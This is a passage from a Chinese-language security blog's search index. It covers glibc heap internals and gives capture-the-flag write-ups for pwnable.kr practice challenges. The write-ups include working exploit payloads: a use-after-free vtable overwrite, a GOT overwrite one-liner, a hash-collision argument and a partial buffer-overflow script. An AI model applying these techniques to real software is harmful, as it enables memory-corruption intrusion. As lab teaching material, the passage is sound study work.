bin中。）","categories":[{"name":"PWN","slug":"PWN","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/Categories/PWN/"},{"name":"Heap","slug":"PWN/Heap","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/Categories/PWN/Heap/"},{"name":"Heap_Basic","slug":"PWN/Heap/Heap-Basic","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/Categories/PWN/Heap/Heap-Basic/"}],"tags":[{"name":"PWN","slug":"PWN","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/tags/PWN/"}]},{"title":"Heap I","slug":"PWN/Heap/Heap-I","date":"2020-10-16T14:10:00.000Z","updated":"2020-11-09T05:10:44.000Z","comments":true,"path":"2020/10/16/PWN/Heap/Heap-I/","link":"","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/2020/10/16/PWN/Heap/Heap-I/","excerpt":"","text":"原版传送门 WHAT IS THE HEAP, AND WHY DO PEOPLE USE IT?堆是C/C++程序员在程序执行期间手动分配的新的区域。程序员通过调用堆相关的函数如malloc向堆管理器请求这部分区域。这些被分配的内存区域，或者称为“allocations”，之后可以被程序员一直使用、修改或者引用，直到他们不再需要这部分区域，会调用free函数将这部分区域返还给堆管理器。 下面是一个C语言程序分配、使用并且释放堆上的结构体的例子： 123456789101112131415161718typedef struct &#123; int field1; char* field2;&#125; SomeStruct;int main()&#123; SomeStruct* myObject = (SomeStruct*)malloc(sizeof(SomeStruct)); if(myObject != NULL) &#123; myObject-&gt;field1 = 1234; myObject-&gt;field2 = “Hello World!”; do_stuff(myObject); free(myObject); &#125; return 0;&#125; 所以只要程序员遵循下面几个小的规则，堆管理器将确保每个已分配的堆不会相互重叠。这个特点使得堆非常有用并且高效，这和大多数C/C++程序追求性能的要求相符合。 接下来的图表列出了一些程序员在使用堆时的基本规则，以及在程序员违反这些规则时发生的一些漏洞类别。之后，我将更详细地讨论所有这些与堆相关的漏洞类别，目前只讨论堆使用正确时的表现。 HEAP RULES 当然，malloc和free并不是C和C++程序员与堆进行交互的唯一方式。相反，C++开发人员通常通过C++运算符new和new []分配内存。必须使用相应的C++运算符delete和delete []而不是free释放这些分配。程序员还可以通过与malloc兼容的堆函数（例如calloc，realloc和memalign）来分配内存，这些函数最终也通过free释放，就像malloc一样。 为简单起见，将首先讨论malloc和free，下面是一个C++程序如何分配，使用和释放堆上的结构体的例子： 12345678910111213141516class SomeClass&#123;public: int field1; char* field2;&#125;;int main()&#123; SomeClass* myObject = new SomeClass(); myObject-&gt;field1 = 1234; myObject-&gt;field2 = “Hello World!”; do_stuff(myObject); delete myObject; return 0;&#125; MEMORY CHUNKS AND THE CHUNK ALLOCATION STRATEGIES假设一个程序员通过malloc需求10字节内存，为了满足这个请求，堆管理器不仅仅只随机寻找一个10字节的程序员可以写的区域，而是需要做更多的事情。堆管理器也需要存储此次分配的元数据。这个元数据被存储在紧邻分配的10字节区域处。 堆管理器还需要确保分配空间在32位系统上是8字节对齐的，在64位系统上是16字节对齐的。如果程序员只想存储文本字符串或字节数组之类的数据，那么分配空间的对齐方式无关紧要。但是如果程序员打算使用分配空间来存储更多复杂的数据结构，则对齐方式会对程序的正确性和性能会产生重大影响。由于malloc无法知道程序员将在分配空间中存储什么内容，因此堆管理器必须默认确保所有分配空间均对齐。 此分配元数据和对齐填充字节与malloc的内存区域将一起被存储并返回给程序员。因此，堆管理器在内部分配的“块”内存比程序员最初要求的稍大。当程序员要求10个字节的内存时，堆管理器会找到或创建一个新的内存块，该块足以存储10个字节的空间、元数据以及对齐填充字节。然后，堆管理器将此块标记为“已分配”，并返回指向块内对齐的10字节“用户数据”区域的指针，程序员将收到malloc调用的返回值。 CHUNK ALLOCATION: BASIC STRATEGY那么堆管理器如何在内部分配这些块呢？ 首先，让我们看一下堆管理器的大部分工作，分配小块内存的（大大简化的）策略。我将在详细地解释每个步骤，之后我们就可以研究分配大块内存的特殊情况。 简化的小块分配策略如下： 如果有一个先前释放的内存块，并且该块足够大，可以满足用户的请求，则堆管理器将使用这个释放的块进行新的分配。 否则，如果堆顶部有可用空间，则堆管理器将从这个空闲的空间中分配一个新的块并使用它。 否则，堆管理器将要求内核向堆的末尾添加新的内存，并且从新分配的空间中分配一个新块给用户。 如果前面所有策略均失败，则无法为提供分配服务，并且malloc返回NULL。 ALLOCATING FROM FREE’D CHUNKS 从概念上讲，分配之前释放的块非常简单。因为当一个块在内存中被释放，堆管理器会在一系列称为“bins”的不同链表中记录这些释放的块。用户发出一个分配请求后，堆管理器会在这些“bins”中搜索一个足够大的空闲块，为用户提供服务。如果可以成功找到一个，则将这个空闲块从特定的bin中删除，并标记为“已分配”，然后这个指向该“user data”区域块的指针，会作为malloc的返回值返回给程序员。 出于性能原因，有几种不同类型的bins，即fast bins 、unsorted bins 、small bins、large bins 、per-thread tcache。下个部分将详细讨论这些不同种类的bins。 ALLOCATING FROM THE TOP OF THE HEAP 如果没有可用的空闲块可以满足分配请求，则堆管理器必须从头开始构造一个新块。为此，堆管理器首先查看堆顶部是否有足够的可用空间（有时称为“top chunk”或“remainder chunk”）。如果存在，堆管理器将在此可用空间基础上构造一个新块。 ASKING THE KERNEL FOR MORE MEMORY AT THE TOP OF THE HEAP 一旦堆顶部的可用空间用完，堆管理器将不得不要求内核在堆的末尾增加更多内存。 在建立堆的开始阶段上，堆管理器通过调用sbrk，要求内核在堆末尾分配更多的内存。在大多数基于Linux的系统上，在内部使用称为“ brk ”的系统调用。这个系统调用的名称很容易混淆，它最初的意思是“更改程序中断位置”，通俗来说，它表示在程序加载到内存之后，该区域会增加更多的内存。因为这是堆管理器从一开始创建堆的地方，所以此系统调用的作用是在程序堆的末尾分配更多的内存。 最终，如果一直使用sbrk扩展堆会导致分配失败，因为堆空间增长得太大之后，进一步扩展将导致其与进程地址空间中的其他内容发生冲突，例如内存映射，共享库或线程的堆栈区域。因此sbrk无法分配时，堆管理器将使用mmap调用将新的非连续内存附加到初始程序堆。 如果mmap也失败，则该进程根本无法分配更多的内存，并且malloc将返回NULL。 OFF-HEAP ALLOCATIONS VIA MMAP很大的分配请求（超过某个阈值*）在堆管理器中会得到特殊处理。通过直接调用mmap可以在堆外分配这些大块，并使用块中元数据的标记位来标记这一事实。当这些巨大块通过调用free释放到堆管理器时，堆管理器将通过munmap将整个mmap 过的区域返还给系统。 *默认情况下，此阈值 在32位系统上为128KB~512KB，在64位系统上为32MB，但是，如果堆管理器检测到这些分配的大块内存只需要被临时使用，则此阈值也会动态增加。 ARENAS在多线程应用程序上，堆管理器需要保护内部堆数据结构免受可能导致程序崩溃的竞争条件的影响。在ptmalloc2之前，堆管理器通过在每次堆操作之前简单地使用全局互斥锁，以确保在任何给定时间只有一个线程可以与堆进行交互。 尽管此策略有效，但堆分配器对高利用率和性能非常敏感，以至于导致使用大量线程的应用程序出现严重的性能问题。为了解决这个问题，ptmalloc2堆分配器引入了“arenas”的概念。每个“arenas”本质上是一个完全不同的堆，它完全独立地管理自己的块分配和free bins。每个“arenas”仍然使用互斥锁来序列化不同线程对内部数据结构的访问，但是只要线程与不同的“arenas”进行交互，线程就可以安全地执行堆操作而不会彼此停顿。 程序的初始（“main”）“arenas”仅包含我们已经看到的堆，对于单线程应用程序，这是堆管理器将使用的唯一arena。但是，随着新线程加入该进程，堆管理器会为每个新线程分配并附加“arenas”，以减少malloc和free等操作的等待时间。 对于每个加入该进程的新线程，堆管理器将先查找没有被其他线程在使用的“arenas”，并将该“arenas”附加到该线程。一旦所有可用的“arenas”都是在其它线程使用中，堆管理器将创建一个新的“arenas”，直到“arenas”的数目达到最大（32位进程为CPU核心数的2倍、64位进程位CPU核心的8倍）。一旦最终达到该限制，堆管理器就会放弃分配，这样多个线程将必须共享一个“arenas”，即执行堆操作将需要那些线程中的一个等待另一个线程。 但是这些二级“arenas”如何工作？我们看到，主堆在程序加载到内存的紧邻其后的位置，并使用brk系统调用对其进行扩展开始工作，但二级“arenas”并不相同，这些二级“arenas”使用mmap和mprotect创建的一个或多个“子堆”来模拟主堆的行为。 SUBHEAPS 子堆的工作方式与初始程序堆基本相同，主要存在两个区别。初始堆位于程序加载到内存之后的紧邻其后的位置，并且由sbrk动态扩展。相比之下，每个子堆使用mmap定位到内存中，堆管理器使用mprotect手动模拟增长子堆。 当堆管理器想要创建子堆时，它首先通过调用mmap要求内核保留该子堆可能增长到的内存区域。保留该区域不会将内存直接分配到子堆中；它只是要求内核不要在该区域内分配诸如线程堆栈，mmap区域或者其它的分配任务。*默认情况下，子堆大小最大（即保留该子堆使用的内存区域）在32位上为1MB，在64位系统上为64MB。 这是通过mmap询问标记为PROT_NONE的页面来完成的，这表明内核仅需要为该区域保留地址范围，不需要内核将内存直接分配给它。 在使用sbrk增长初始堆的地方，堆管理器通过手动调用mprotect将区域中的页面从PROT_NONE更改为PROT_READ | PROT_WRITE来将子堆“增长”到此保留的地址范围。这导致内核将物理内存附加到那些地址，实际上也会导致子堆缓慢增长，直到整个mmap区域已满。一旦整个子堆都用完，arenas便会分配另一个子堆。这将允许二级”arenas”几乎无限期地保持增长，直到内核耗尽内存或进程耗尽地址空间时才会失败。 Recap：初始（“main”）arena仅包含主堆，该主堆位于将程序二进制文件加载到内存之后的位置，并使用sbrk进行扩展。这是用于单线程应用程序的唯一arena。在多线程应用程序上，为新线程分配了二级arena，从中可以分配这些二级arena。使用arenas可以降低线程在执行堆操作之前需要等待互斥锁的可能性，从而提高了程序的速度。与main arena不同，这些二级arena从一个或多个子堆中分配块，这些子堆在内存中的位置首先使用mmap进行确定，并通过使用mprotect进行扩展。 CHUNK METADATA现在，了解了分配块的所有不同方式，这些块不仅包含提供给程序员的“用户数据”区域（作为malloc的返回值），同时包含元数据。下面介绍元数据实际记录的值以及存放的位置。 块的元数据在内存中的确切布局可能会很混乱，因为堆管理器源代码将一个块末尾的元数据与下一个块末尾的元数据组合在一起，并且几个存在并被使用的元数据字段取决于不同种类的chunk。 现在，我们仅看一下实时分配，它具有单个size_t 标头，该标头位于给程序员的“用户数据”区域的后面。此字段（在源代码中称为mchunk_size）是在malloc期间写入的，之后由free*决定如何处理该分配空间的释放。 * size_t值在32位系统上为4字节整数，在64位系统上为8字节整数。 该mchunk_size存储了四种信息：块的大小，以及被称为“A”,“M”和“P”三比特位。这些都被存储在相同的size_t字段中，因为块大小始终是8字节对齐的（在64位上是16字节对齐），因此，块大小的低三位始终为零。 “ A ”标志是用来告诉堆管理器，是否该块属于二级arena，而不是在main arena。在free期间，堆管理器仅仅给了一个指向程序员想要释放空间的指针，并且堆管理器需要确定该指针属于哪一个arena。如果在块的元数据中A标志被设置，则堆管理器必须搜索每个arena，并查看指针是否位于该arena的任何子堆中。如果未设置该标志，则堆管理器可以减少搜索，因为它知道该块来自初始的arena。 “ M ”标志用于指示该块是一个通过mmap进行堆外分配的巨大分配。当此分配空间最终返回给free时，堆管理器将通过munmap立即将整个块返回给操作系统，而不是尝试对其进行回收。因此，空闲即已经被释放的块永远不会设置该标志位。 “ P ”标志令人困惑，因为它实际上属于先前的块。它指示先前的块是一个空闲块。这意味着当这个块被释放时，可以将其安全地连接到先前的块上，以创建更大的空闲块。 下面是一些和堆相关的文章： Once upon a free() Malloc des-maleficarum The house of lore Advanced Doug Lea’s malloc exploits Yet another free() exploitation technique","categories":[{"name":"PWN","slug":"PWN","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/Categories/PWN/"},{"name":"Heap","slug":"PWN/Heap","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/Categories/PWN/Heap/"},{"name":"Heap_Basic","slug":"PWN/Heap/Heap-Basic","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/Categories/PWN/Heap/Heap-Basic/"}],"tags":[{"name":"PWN","slug":"PWN","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/tags/PWN/"}]},{"title":"uaf","slug":"PWN/Pwnable_kr/uaf","date":"2020-10-16T02:26:47.000Z","updated":"2020-10-19T07:10:20.000Z","comments":true,"path":"2020/10/16/PWN/Pwnable_kr/uaf/","link":"","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/2020/10/16/PWN/Pwnable_kr/uaf/","excerpt":"","text":"查看uaf.cpp文件源代码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778#include &lt;fcntl.h&gt;#include &lt;iostream&gt;#include &lt;cstring&gt;#include &lt;cstdlib&gt;#include &lt;unistd.h&gt;using namespace std;class Human&#123;private: virtual void give_shell()&#123; system(&quot;/bin/sh&quot;); &#125;protected: int age; string name;public: virtual void introduce()&#123; cout &lt;&lt; &quot;My name is &quot; &lt;&lt; name &lt;&lt; endl; cout &lt;&lt; &quot;I am &quot; &lt;&lt; age &lt;&lt; &quot; years old&quot; &lt;&lt; endl; &#125;&#125;;class Man: public Human&#123;public: Man(string name, int age)&#123; this-&gt;name = name; this-&gt;age = age; &#125; virtual void introduce()&#123; Human::introduce(); cout &lt;&lt; &quot;I am a nice guy!&quot; &lt;&lt; endl; &#125;&#125;;class Woman: public Human&#123;public: Woman(string name, int age)&#123; this-&gt;name = name; this-&gt;age = age; &#125; virtual void introduce()&#123; Human::introduce(); cout &lt;&lt; &quot;I am a cute girl!&quot; &lt;&lt; endl; &#125;&#125;;int main(int argc, char* argv[])&#123; Human* m = new Man(&quot;Jack&quot;, 25); Human* w = new Woman(&quot;Jill&quot;, 21); size_t len; char* data; unsigned int op; while(1)&#123; cout &lt;&lt; &quot;1. use\\n2. after\\n3. free\\n&quot;; cin &gt;&gt; op; switch(op)&#123; case 1: m-&gt;introduce(); w-&gt;introduce(); break; case 2: len = atoi(argv[1]); data = new char[len]; read(open(argv[2], O_RDONLY), data, len); cout &lt;&lt; &quot;your data is allocated&quot; &lt;&lt; endl; break; case 3: delete m; delete w; break; default: break; &#125; &#125; return 0;&#125; 程序定义一个名为human的虚基类，之后定义了Man和Woman两个类继承这个类，并各自重写了父类的introduce()方法，主函数中，分别创建了一个Man和Woman的对象, 用户可以输入三个选项，分别为： use：Man和Woman分别调用introduce()方法，即使用指针指向的函数 after：分配一段地址空间存储main函数传递的数据，我们可以用其将已经被free的内存，重新allocate free：delete释放掉创建的对象的空间，即将指针指向的内存释放 三者的组合即可构成UAF漏洞 背景知识前置知识1：虚函数的内存地址空间在C++中，如果类中有虚函数，那么它就会有一个虚函数表的指针__vfptr，在类对象最开始的内存数据中。之后是类中的成员变量的内存数据。对于子类，最开始的内存数据记录着父类对象的拷贝（包括父类虚函数表指针和成员变量）。 之后是子类自己的成员变量数据。 1234567891011121314151617181920212223242526272829303132class Base &#123; public: virtual void f() &#123; cout &lt;&lt; &quot;Base::f&quot; &lt;&lt; endl; &#125; virtual void g() &#123; cout &lt;&lt; &quot;Base::g&quot; &lt;&lt; endl; &#125; virtual void h() &#123; cout &lt;&lt; &quot;Base::h&quot; &lt;&lt; endl; &#125; int base; protected: private: &#125;; //子类1，无虚函数重载 class Child1 : public Base &#123; public: virtual void f1() &#123; cout &lt;&lt; &quot;Child1::f1&quot; &lt;&lt; endl; &#125; virtual void g1() &#123; cout &lt;&lt; &quot;Child1::g1&quot; &lt;&lt; endl; &#125; virtual void h1() &#123; cout &lt;&lt; &quot;Child1::h1&quot; &lt;&lt; endl; &#125; int child1; protected: private: &#125;; //子类2，有1个虚函数重载 class Child2 : public Base &#123; public: virtual void f() &#123; cout &lt;&lt; &quot;Child2::f&quot; &lt;&lt; endl; &#125; virtual void g2() &#123; cout &lt;&lt; &quot;Child2::g2&quot; &lt;&lt; endl; &#125; virtual void h2() &#123; cout &lt;&lt; &quot;Child2::h2&quot; &lt;&lt; endl; &#125; int child2; protected: private: &#125;; 单一继承，无虚函数重载 单一继承，重载了虚函数 多重继承 总结 如果一个类中有虚函数，那么就会建立一张虚函数表vtable，子类继承父类vtable，若，父类的vtable中私有(private)虚函数,则子类vtable中同样有该私有(private)虚函数的地址。注意这并不是直接继承了私有(private)虚函数 当子类重载父类虚函数时，修改vtable同名函数地址，改为指向子类的函数地址，若子类中有新的虚函数，在vtable尾部添加。 vptr每个对象都会有一个，而vptable是每个类有一个，vptr指向vtable，一个类中就算有多个虚函数，也只有一个vptr；做多重继承的时候，继承了多个父类，就会有多个vptr Use-After-FreeDangling pointer Dangling pointer即指向被释放的内存的指针，通常是由于释放内存后，未将指针置为NULL。 UAF原理对Dangling pointer所指向内存进行use，如指针解引用等。 利用思路将Dangling pointer所指向的内存重新分配回来，且尽可能使该内存中的内容可控（如重新分配为字符串） 举个栗子123456typedef struct&#123; int id; char *name; int (*func)() //函数指针，可以理解为类里面的方法&#125;; 假设有上述这样的一个结构体指针p，在释放掉p之后，没有将p置NULL，所以p变成Dangling pointer，再通过重新分配，再次拿到p之前指向的这段地址空间。之后，通过strcpy(p2,”addr”)，或者其他方式，向这段地址空间写入新数据。然后当我们通过其他函数，再次使用p指针，就会造成无法预料的后果，因为此时p指针指向的内存包含的内容已经改变。 数据控制 任意地址读：$puts(p-&gt;name)—————&gt;puts(char*(addr2))$ 任意地址写：$strcpy(p-&gt;name,data);——&gt;strcpy((char *)(addr2),data)$ 控制流劫持：$p-&gt;func()———————&gt;call\\ addr3$ 解题思路查看文件保护措施 思路分析可以看出Man和Woman都是继承了Human类，并且可以看出只要我们将控制流劫持到Human类的私有虚函数give_shell，就能getshell了。 基本思路为：将main函数创建的两个对象先free，但指针并没有被销毁，之后我们allocate同样的大小，可以得到原先被释放的内存，这样就得到一个可控的地址空间，并且这个空间中记录了之前vptr指针，这样可通过改写这个虚表指针的值，之后再利用use，即m-&gt;introduce()时，劫持程序执行流，将本来执行的introduce函数变成执行give_shell函数。注意main中输入2分配空间是读取传入的两个参数，第一个决定分配空间的大小，第二个是读入一个文件，将文件中的内容写入到刚刚分配的空间中，因此我们首先要取得之前释放的空间，为保证这一点，需要使得传递的参数和之前释放的空间大小相同，而且这里需要分配两次，因为是两个对象，之后文件中的内容需将之前的虚表指针的值覆盖成我们想要的值，因为每个对象空间中的第一项记录的就是vptr，所以直接向文件中写入改写的虚表指针的值即可(从头开始读入，否则中间还需要填充一些字段)。 寻找vtable的地址 直接在将文件拖入IDA64中查看（当然这里也可以用gdb动态调试，从main函数一步步跟进）。因为vptr指向的是vtable中的第一项，由第一项存放的内容是函数give_shell的地址，找到give_shell的位置可以确定vptr的地址为$0x401570$，第二项，即vptr+8所指向的位置，存放的内容是子类重写的函数introduce的地址，main函数中输入1（use）会调用introduce函数，因此我们需要在调用introduce函数时，讲vptr的指针指向give_shell函数，即将指针向前移动8个字节长度。 10x401570 - 8 = 0x401568 -&gt; \\x68\\x15\\x40\\x00\\x00\\x00\\x00\\x00 确定每个对象分配的空间大小 可见原本分配的两个对象的空间为$0x18 = 24Byte$，所以之后分配的空间也同样为24字节。（这里没有必要手动计算类对象所占空间的大小，因为不同机器可能会存在差异，知道存在哪些项即可，不必过于纠结为什么是24字节。） 整理如下 输入3（free）：将分配的man和woman的空间释放（这里先释放man，在释放woman） 输入2（allocate）：先将woman释放的空间重新拿回 输入2（allocate）：再将man释放的空间重新拿回 输入（use）：通过传递的参数已经改写了vptr的值，执行introduce即give_shell，拿到flag PWN1python -c &quot;print &#x27;\\x68\\x15\\x40\\x00\\x00\\x00\\x00\\x00&#x27;&quot; &gt; /tmp/exp.txt","categories":[{"name":"PWN","slug":"PWN","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/Categories/PWN/"},{"name":"Pwnable.kr","slug":"PWN/Pwnable-kr","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/Categories/PWN/Pwnable-kr/"},{"name":"Toddler's Bottle","slug":"PWN/Pwnable-kr/Toddler-s-Bottle","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/Categories/PWN/Pwnable-kr/Toddler-s-Bottle/"}],"tags":[{"name":"PWN","slug":"PWN","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/tags/PWN/"}]},{"title":"random","slug":"PWN/Pwnable_kr/random","date":"2020-10-15T11:10:35.000Z","updated":"2020-10-19T07:10:12.000Z","comments":true,"path":"2020/10/15/PWN/Pwnable_kr/random/","link":"","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/2020/10/15/PWN/Pwnable_kr/random/","excerpt":"","text":"查看random.c源代码 函数的整个执行流程是rand（）产生的随机值和输入的密钥进行异或，若其结果等于$0xdeadbeef$，则可以执行system函数，拿到flag。 rand（）函数 由此可见，如果不重新生成种子（一般情况下，默认生成种子为1），则每次产生的随机数将会是一个固定值，那么接下来的任务就是确定这个固定值。 查看随机数$disassemble /r \\ main$查看汇编代码 在cmp处下断点汇编代码中，在进行cmp之前先进行了一次异或运算，显然这是将用户输入的key和生成的随机数进行异或，由此可以判断随机数的位置为$rbp-4$（先压入栈中），因此使用$x/10x \\ $rbp-4$查看内存的值即可。 所以生成的随机数为0x6b8b4567，可多次运行程序查看其值是否发生变化，这里不做演示。 PWN求出$0x6b8b4567\\oplus 0xdeadbeef$的值输入即可","categories":[{"name":"PWN","slug":"PWN","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/Categories/PWN/"},{"name":"Pwnable.kr","slug":"PWN/Pwnable-kr","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/Categories/PWN/Pwnable-kr/"},{"name":"Toddler's Bottle","slug":"PWN/Pwnable-kr/Toddler-s-Bottle","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/Categories/PWN/Pwnable-kr/Toddler-s-Bottle/"}],"tags":[{"name":"PWN","slug":"PWN","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/tags/PWN/"}]},{"title":"collision","slug":"PWN/Pwnable_kr/collision","date":"2020-10-15T11:10:23.000Z","updated":"2020-10-19T07:09:52.000Z","comments":true,"path":"2020/10/15/PWN/Pwnable_kr/collision/","link":"","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/2020/10/15/PWN/Pwnable_kr/collision/","excerpt":"","text":"查看C语言源代码 main(int argc, char* argv[]) 传递三个参数$aa,bb,cc$, 程序运行结果如下: 注意：若传递n个参数，实际上相当于给main函数传递了n+1个参数，argc=n+1（因为argv[0]是路径名自动传递） 分析col.c 函数传递了两个参数，第一个参数为int型，第二个参数为一个字符数组，main函数首先判断第一个参数如果小于2,即若不显式传递参数，则打印argv[0]之后会直接退出。 argv[1]，即传入的第二个参数，第一个参数为文件所在路径，指向的字符串的长度需要等于20字节。 check_password函数将指向20字节的字符指针转为int指针，因为int是4字节，即将20字节字符串拆分成为5个int类型的数据，之后求和。 如果求和的结果和给定的哈希值0x21DD09EC相等，则会执行system函数拿到flag。 最直接的想法是暴力穷举，寻找哈希碰撞，但实际上这里可以直接凑出这个哈希值，可以令20字节的前16字节都设置为0x01，注意不能设置为0x00，因为0x00是一个截断字符，程序读入argv[1]时如果遇到了0x00会自动截断，从而导致程序结果有误。 另外，注意数据按照小端序存放： 编写python脚本 12./col $(python -c &quot;print &#x27;\\x01\\x01\\x01\\x01&#x27;*4 + &#x27;\\xe8\\x05\\xd9\\x1d&#x27;&quot;)# 这一inline的python表达式可以将生成的结果作为argv[1]参数 PWN","categories":[{"name":"PWN","slug":"PWN","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/Categories/PWN/"},{"name":"Pwnable.kr","slug":"PWN/Pwnable-kr","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/Categories/PWN/Pwnable-kr/"},{"name":"Toddler's Bottle","slug":"PWN/Pwnable-kr/Toddler-s-Bottle","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/Categories/PWN/Pwnable-kr/Toddler-s-Bottle/"}],"tags":[{"name":"PWN","slug":"PWN","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/tags/PWN/"}]},{"title":"flag","slug":"PWN/Pwnable_kr/flag","date":"2020-10-15T11:10:06.000Z","updated":"2020-10-19T07:10:00.000Z","comments":true,"path":"2020/10/15/PWN/Pwnable_kr/flag/","link":"","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/2020/10/15/PWN/Pwnable_kr/flag/","excerpt":"","text":"checksec查看文件属性 windows下使用upx -d命令解压缩 IDA64打开解压缩的文件 将flag的值存放到dest中，直接查看flag即可","categories":[{"name":"PWN","slug":"PWN","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/Categories/PWN/"},{"name":"Pwnable.kr","slug":"PWN/Pwnable-kr","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/Categories/PWN/Pwnable-kr/"},{"name":"Toddler's Bottle","slug":"PWN/Pwnable-kr/Toddler-s-Bottle","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/Categories/PWN/Pwnable-kr/Toddler-s-Bottle/"}],"tags":[{"name":"PWN","slug":"PWN","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/tags/PWN/"}]},{"title":"fd","slug":"PWN/Pwnable_kr/fd","date":"2020-10-15T10:59:24.000Z","updated":"2020-10-19T07:09:56.000Z","comments":true,"path":"2020/10/15/PWN/Pwnable_kr/fd/","link":"","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/2020/10/15/PWN/Pwnable_kr/fd/","excerpt":"","text":"登录远程服务器 ls -la查看文件信息linux文件权限知识 发现fd.c和其对应的可执行文件fd（用户有执行权限） cat fd.c查看c语言代码 有源代码可知，这里需要执行system函数的条件为buf缓冲区内容为LETMEIWN read(fd,buf,32)1234567read(fd, buf, 32)fd == 0时：则表示标准输入；fd == 1时：则表示标准输出；fd == 2时，则表示标准输出错误。buf 表示读入的缓冲区；32表示读入32字节； 因此我们需要设置fd为0，读取我们输入的LETMEWIN到buf缓冲区中即可获得flag。 注意到 1fd = atoi(argv[1]) - 0x1234 要使得$fd=0$，就是让main函数的第一个参数argv[1]等于$0x1234$ ./fd 4660 注意这里参数需要转为10进制 $0x1234_{16} = 4660_{10}$ 1flag: mommy! I think I know what a file descriptor is!!","categories":[{"name":"PWN","slug":"PWN","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/Categories/PWN/"},{"name":"Pwnable.kr","slug":"PWN/Pwnable-kr","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/Categories/PWN/Pwnable-kr/"},{"name":"Toddler's Bottle","slug":"PWN/Pwnable-kr/Toddler-s-Bottle","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/Categories/PWN/Pwnable-kr/Toddler-s-Bottle/"}],"tags":[{"name":"PWN","slug":"PWN","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/tags/PWN/"}]},{"title":"passcode","slug":"PWN/Pwnable_kr/passcode","date":"2020-10-15T07:08:39.000Z","updated":"2020-10-19T07:10:08.000Z","comments":true,"path":"2020/10/15/PWN/Pwnable_kr/passcode/","link":"","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/2020/10/15/PWN/Pwnable_kr/passcode/","excerpt":"","text":"查看passcode.c源文件 第一反应为使得passcode1为338150、passcode2为13371337，之后调用system函数。 login函数中要求输入两个密码passcode1和passcode2，但scanf函数用法错误，其后并没有加上&amp;符号取其地址，而是直接使用了栈上两个没有初始化的随机值，因此直接输入则会出现segmentation fault。因此考虑在login函数之前执行的welcome函数。 welcome函数要求用户输入姓名的字符串，但是允许输入100字节长度，因此尝试使用其覆盖栈上两个变量的“随机值”。 gdb passcode查看其汇编代码disassemble /r welcome disassemble /r login 发现char数组在$ebp - 0x70$处，而passcode1、passcode2分别在$ebp - 0x10、ebp - 0xc$处，其相差的距离$0x70 - 0x10 = 96 &lt; 100,0x70 - 0xc = 100$，因此并不能直接通过输入姓名字符串覆盖变量passcode2,只可以覆盖passcode1。 转换思路查看文件保护措施 栈上开启了Canary机制，因此栈溢出很难成功，发现没有开启PIE，因此可以通过修改某些函数got表的地址，进行调用system函数。实际上，既然scanf是一个具有写功能的函数，我们完全可以利用scanf来修改此后使用到的某个函数的got表项。例如，程序在scanf(“%d”, passcode1);后立即使用了fflush函数，所以我们完全可以先找到fflush的got表项地址（程序没有开PIE，无需leak），把passcode1布局为该地址，并在调用到scanf(“%d”, passcode1)时输入程序代码中调用system(“/bin/cat flag”);处的地址，这样执行fflush函数时就会执行system函数。 注意这里区分got表本身的地址和写入got表项中的地址 fflush函数的地址 fflush地址为$0x0804a004$ system函数的地址 这里注意system函数需要将参数先压栈之后再调用，即真正调用的函数地址为$0x080485e3$，即在printf函数之后执行。 编写python脚本1python -c &quot;print &#x27;A&#x27; * 96 + &#x27;\\x04\\xa0\\x04\\x08&#x27; + &#x27;134514147\\n&#x27;&quot; | ./passcode 因为passcode是输入int型，即输入$0x080485e3 = 134514147$。 PWN","categories":[{"name":"PWN","slug":"PWN","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/Categories/PWN/"},{"name":"Pwnable.kr","slug":"PWN/Pwnable-kr","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/Categories/PWN/Pwnable-kr/"},{"name":"Toddler's Bottle","slug":"PWN/Pwnable-kr/Toddler-s-Bottle","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/Categories/PWN/Pwnable-kr/Toddler-s-Bottle/"}],"tags":[{"name":"PWN","slug":"PWN","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/tags/PWN/"}]},{"title":"bof","slug":"PWN/Pwnable_kr/bof","date":"2020-10-15T06:33:21.000Z","updated":"2020-10-19T07:09:44.000Z","comments":true,"path":"2020/10/15/PWN/Pwnable_kr/bof/","link":"","permalink":"https://github.com/xiaohong404/xiaohong404.github.io/2020/10/15/PWN/Pwnable_kr/bof/","excerpt":"","text":"查看给出的c语言源代码 显然，简单的缓冲区溢出，将key通过缓冲区溢出覆盖为0xcafebabe，即可通过判断条件，执行system函数。 IDA32打开文件 编写python脚本123456from pwn import *io = remote(&#x27;pwnable.kr&#x27;,9000)payload = &#x27;a&#x27;*0x2C + &#x27;junk&#x27; + &#x27;junk&#x27; + 